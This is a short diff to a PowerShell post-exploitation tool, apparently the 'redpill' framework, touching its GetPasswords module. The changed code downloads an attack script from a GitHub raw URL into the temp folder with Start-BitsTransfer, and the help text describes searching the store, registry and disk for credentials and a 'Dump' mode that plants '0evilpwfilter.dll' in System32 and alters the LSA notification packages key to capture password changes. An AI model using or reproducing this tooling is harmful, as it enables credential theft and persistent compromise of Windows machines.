@@ -1194,7 +1194,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,1044921875/KB
+      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,4609375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3231,14 +3231,14 @@ $HelpParameters = @"
       Helper - Search for creds in diferent locations {store|regedit|disk}
 
    .DESCRIPTION
-      -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
+      -GetPasswords [ Enum ] search creds in store\reg\disk diferent locations.
       -GetPasswords [ Dump ] Explores a native OS notification of when the user
       account password gets changed which is responsible for validating it.
 
    .NOTES
-      -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
+      -GetPasswords [ Dump ] requires Administrator privileges
       To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
-      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
+      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key by executing:
       REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
 
    .Parameter GetPasswords
